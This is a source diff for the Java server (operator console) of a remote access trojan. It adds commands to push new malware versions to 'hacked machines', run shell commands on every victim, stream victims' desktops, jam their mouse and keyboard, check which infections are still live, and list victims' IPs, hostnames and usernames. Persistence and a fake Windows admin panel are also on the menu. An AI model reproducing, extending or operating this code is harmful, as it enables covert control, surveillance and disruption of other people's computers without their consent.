@@ -19,6 +19,7 @@ public class Server implements Runnable {
     DataOutputStream dout;
     PrintStream ps;
     OutputStream os;
+    String hostinfo;
     ArrayList<Socket> sessions = new ArrayList<Socket>();
     ArrayList<String> hostnames = new ArrayList<String>();
     ArrayList<String> lanIPs = new ArrayList<String>();
@@ -46,21 +47,25 @@ public class Server implements Runnable {
                     System.out.println("HELP MENU:");
                     System.out.println("\tWORKING - persist - initiate persistance on remote machine");
                     System.out.println("\tWORKING - shell - enter a stateless shell environment");
-                    System.out.println("\tIN PROGRESS - keylogger - track keypresses of infected machine");
-                    System.out.println("\tIN PROGRESS - upload - open prompt for uploading a file");
-                    System.out.println("\tIN PROGRESS - batchupload - upload a single file to many computers");
-                    System.out.println("\tIN PROGRESS - download - open prompt for downloading a remote file");
+                    System.out.println("\tWORKING - batchshell - run a shell command on all hacked machines");
+                    System.out.println("\tWORKING - update - update selected hacked machines with a new malware version");
+                    System.out.println("\tWORKING - batchupdate - update all hacked machines with a new malware version");
+                    System.out.println("\tWORKING - viewscreen - view a live feed of the victims desktop");
+                    System.out.println("\tWORKING - batchupload - upload a single file to many computers");
+                    System.out.println("\tWORKING - kill - kill the malware on the remote machine");
                     /// System.out.println("\tIN PROGRESS - screenshot - take a screenshot of the
                     /// remote machine");
                     // System.out.println("\tIN PROGRESS - webcam - take an image using the victims
                     /// camera");
-                    // System.out.println("\tIN PROGRESS - mousebreak - prevent the victims mouse
-                    /// from moving");
-                    // System.out.println("\tIN PROGRESS - keybreak - create issues with the victims
-                    /// keyboard");
+                    System.out.println("\tWORKING - mousebreak - cause the victims mouse to randomly move");
+                    System.out.println("\tIN PROGRESS - keybreak - spam random keys on the victims machine");
                     System.out.println("\tWORKING - adminpanel - creates a fake windows admin panel");
+                    System.out.println("\tWORKING - heartbeat - check all hacked machines for an active connection, removing those offline");
                     System.out.println("\tWORKING - sessions - lists sessions");
                     System.out.println("\tWORKING - selectsession - change to a different session");
+                    System.out.println("\tSEMI-WORKING - upload - open prompt for uploading a file");
+                    System.out.println("\tIN PROGRESS - download - open prompt for downloading a remote file");
+                    System.out.println("\tNOT WORKING - keylogger - track keypresses of infected machine");
                 }
                 if (command.equals("persist")) {
                     try {
@@ -104,6 +109,70 @@ public class Server implements Runnable {
                         System.out.println("session might be offline!");
                     }
                 }
+                if (command.equals("update")) {
+                    System.out.println("field update initiated");
+                    System.out.println("enter the file name of the new malware version: ");
+                    ps.println("upd");
+                    Scanner input = new Scanner(System.in);
+                    String locDest = input.nextLine();
+                    File fileToUpload = new File(locDest);
+                    if (!fileToUpload.exists()) {
+                        System.out.println("file doesn't exist, cancelling update");
+                    } else {
+                        byte[] fileBytes = new byte[(int) fileToUpload.length()];
+                        BufferedInputStream bin = new BufferedInputStream(new FileInputStream(fileToUpload));
+                        bin.read(fileBytes);
+
+                        System.out.println("sending file " + locDest + " for live update");
+                        os.write(fileBytes);
+                        os.flush();
+
+                        System.out.println("finished new version upload");
+                        System.out.println("remote connection will not perform automated update, expect session errors and disconnection");
+                        System.out.println("SESSION DISCONNECTING");
+                    }
+                }
+                if (command.equals("batchupdate")) {
+                    System.out.println("batch field update initiated");
+                    System.out.println("enter the file name of the new malware version: ");
+                    Scanner input = new Scanner(System.in);
+                    String locDest = input.nextLine();
+                    File fileToUpload = new File(locDest);
+                    byte[] fileBytes = new byte[(int) fileToUpload.length()];
+                    BufferedInputStream bin = new BufferedInputStream(new FileInputStream(fileToUpload));
+                    bin.read(fileBytes);
+                    if (!fileToUpload.exists()) {
+                        System.out.println("file doesn't exist, cancelling update");
+                    } else {
+                        for(int i=0;i<sessions.size();i++) {
+                            try {
+                                System.out.println("Sending update to " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i));
+                                s = sessions.get(i);
+                                ps = new PrintStream(s.getOutputStream());
+                                os = s.getOutputStream();
+                                din = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                                ps.println("a");
+                                String chk = din.readLine();
+                                if (!chk.equals("a")) {
+                                    System.out.println("DATA COMMUNICATION ERROR - SESSION MIGHT BE OUT OF SYNC");
+                                    continue;
+                                }
+                                Thread.sleep(50);
+                                ps.println("upd");
+                                Thread.sleep(50);
+                                //byte[] fileBytes = new byte[(int) fileToUpload.length()];
+                                //BufferedInputStream bin = new BufferedInputStream(new FileInputStream(fileToUpload));
+                                //bin.read(fileBytes);
+        
+                                System.out.println("sending file " + locDest + " for live update");
+                                os.write(fileBytes);
+                                os.flush();
+                            } catch (Exception e) {
+                                System.out.println("An error occured sending file to " + sessions.get(i).getInetAddress());
+                            }
+                        }
+                    }
+                }
                 if (command.equals("batchshell")) {
                     System.out.println("what command would you like to execute");
                     System.out.print("command:");
@@ -141,6 +210,24 @@ public class Server implements Runnable {
                             Thread.sleep(100);
                         } catch (Exception e) {
                             e.printStackTrace();
+                        }
+                    }
+                }
+                if (command.equals("viewscreen")) {
+                    System.out.println("opening remote viewing module");
+                    ps.println("rmv");
+                    for(int i=40000;i<45000;i++) {
+                        if (!isPortInUse(i)) {
+                            System.out.println("using port: " + i);
+                            (new Thread(new StreamListener(i,hostinfo))).start();
+                            System.out.println("thread started");
+                            try {
+                                Thread.sleep(200);
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                            }
+                            ps.println(i+"");
+                            break;
                         }
                     }
                 }
@@ -344,15 +431,37 @@ public class Server implements Runnable {
                 }
                 if (command.equals("mousebreak")) {
                     System.out.println("mousebreak attack initiated");
-
+                    System.out.println("would you like to enable or disable mousebreak: ");
+                    Scanner sc = new Scanner(System.in);
+                    String choice = sc.nextLine();
+                    if (!choice.toLowerCase().equals("enable") && !choice.toLowerCase().equals("disable")) {
+                        System.out.println("please make sure you type either enable or disable");
+                    } else if (choice.toLowerCase().equals("enable")) {
+                        ps.println("mbs");
+                    } else {
+                        ps.println("mbe");
+                    }
                 }
                 if (command.equals("keybreak")) {
                     System.out.println("keybreak attack initiated");
-
+                    System.out.println("would you like to enable or disable keybreak: ");
+                    Scanner sc = new Scanner(System.in);
+                    String choice = sc.nextLine();
+                    if (!choice.toLowerCase().equals("enable") && !choice.toLowerCase().equals("disable")) {
+                        System.out.println("please make sure you type either enable or disable");
+                    } else if (choice.toLowerCase().equals("enable")) {
+                        ps.println("kbs");
+                    } else {
+                        ps.println("kbe");
+                    }
                 }
                 if (command.equals("nircmd")) {
                     System.out.println("nircmd control initiated");
 
+                }
+                if (command.equals("kill")) {
+                    System.out.println("Killing remote session, session will die");
+                    ps.println("q");
                 }
                 if (command.equals("adminpanel")) {
                     System.out.println("starting remote admin panel");
@@ -371,8 +480,67 @@ public class Server implements Runnable {
                     }
                     System.out.println();
                 }
+                if (command.equals("heartbeat")) {
+                    System.out.println("evaluating online status of all hacked machines");
+                    for(int i=0;i<sessions.size();i++) {
+                        try {
+                            System.out.println("TESTING: " + i + " - " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i) + " - " + lanIPs.get(i) + " - " + usernames.get(i));
+                            s = sessions.get(i);
+                            ps = new PrintStream(s.getOutputStream());
+                            os = s.getOutputStream();
+                            din = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                            ps.println("a");
+                            String chk = din.readLine();
+                            if (!chk.equals("a")) {
+                                System.out.println("DATA COMMUNICATION ERROR - SESSION MIGHT BE OUT OF SYNC");
+                                sessions.remove(i);
+                                hostnames.remove(i);
+                                lanIPs.remove(i);
+                                localIPs.remove(i);
+                                i--;
+                                continue;
+                            }
+                            
+                        } catch (Exception e) {
+                            System.out.println("Hearbeat failed for " + sessions.get(i).getInetAddress());
+                            sessions.remove(i);
+                            hostnames.remove(i);
+                            lanIPs.remove(i);
+                            localIPs.remove(i);
+                            i--;
+                            continue;
+                        }
+                        System.out.println("ONLINE: " + sessions.get(i).getInetAddress());
+                    }
+                }
                 if (command.equals("sessions")) {
                     try {
+                        System.out.println("Performing heartbeat before listing sessions...");
+                        for(int i=0;i<sessions.size();i++) {
+                            try {
+                                s = sessions.get(i);
+                                ps = new PrintStream(s.getOutputStream());
+                                os = s.getOutputStream();
+                                din = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                                ps.println("a");
+                                String chk = din.readLine();
+                                if (!chk.equals("a")) {
+                                    sessions.remove(i);
+                                    hostnames.remove(i);
+                                    lanIPs.remove(i);
+                                    localIPs.remove(i);
+                                    i--;
+                                    continue;
+                                }
+                            } catch (Exception e) {
+                                sessions.remove(i);
+                                hostnames.remove(i);
+                                lanIPs.remove(i);
+                                localIPs.remove(i);
+                                i--;
+                                continue;
+                            }
+                        }
                         System.out.println("LISTING SESSIONS:\n");
                         for (int i = 0; i < sessions.size(); i++) {
                             System.out.print(i + " - " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i) + " - " + lanIPs.get(i) + " - " + usernames.get(i));
@@ -396,6 +564,7 @@ public class Server implements Runnable {
                         ps = new PrintStream(s.getOutputStream());
                         os = s.getOutputStream();
                         din = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                        hostinfo = sesnum + " - " + sessions.get(sesnum).getInetAddress() + " - " + hostnames.get(sesnum) + " - " + lanIPs.get(sesnum) + " - " + usernames.get(sesnum);
                         ps.println("a");
                         String chk = din.readLine();
                         if (!chk.equals("a")) {
@@ -413,6 +582,10 @@ public class Server implements Runnable {
                         localIPs.remove(tsesnum);
                     }
                 }
+                if (command.equals("exit")) {
+                    System.out.println("Quitting the program, connected machines will try to reconnect");
+                    System.exit(0);
+                }
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -421,7 +594,6 @@ public class Server implements Runnable {
 
     private void switchSession(int i) {
         Socket current = sessions.get(i);
-
     }
 
     public void addSocket(Socket cs) {
@@ -445,9 +617,15 @@ public class Server implements Runnable {
             tdin.readLine();
             ArrayList<String> tempips = new ArrayList<String>();
             String tline = tdin.readLine();
+            //System.out.println(tline);
             while(!tline.equals("{}{}{}")) {
+                //System.out.println(tline);
                 if (tline.trim().length()>0) {
-                    tempips.add(tline.trim().substring(tline.indexOf("\"")+1,tline.indexOf(",")-1));
+                    if (tline.indexOf(",") != -1) {
+                        tempips.add(tline.trim().substring(tline.indexOf("\"")+1,tline.indexOf(",")-1));
+                    } else {
+                        tempips.add(tline.trim().substring(tline.indexOf("\"")+1,tline.lastIndexOf("\"")));
+                    }
                 }
                 tline = tdin.readLine();
             }
@@ -488,5 +666,24 @@ public class Server implements Runnable {
             e.printStackTrace();
             System.out.println("failed to add new socket");
         }
+    }
+    public static boolean isPortInUse(int port) {
+        ServerSocket socket = null;
+        try {
+            socket = new ServerSocket(port);
+            socket.setReuseAddress(true);
+        } catch (Exception e) {
+            return true;
+        }
+        finally {
+            if (socket != null) {
+                try {
+                    socket.close();
+                } catch (Exception e) {
+                    return true;
+                }
+            }
+        }
+        return false;
     }
 }
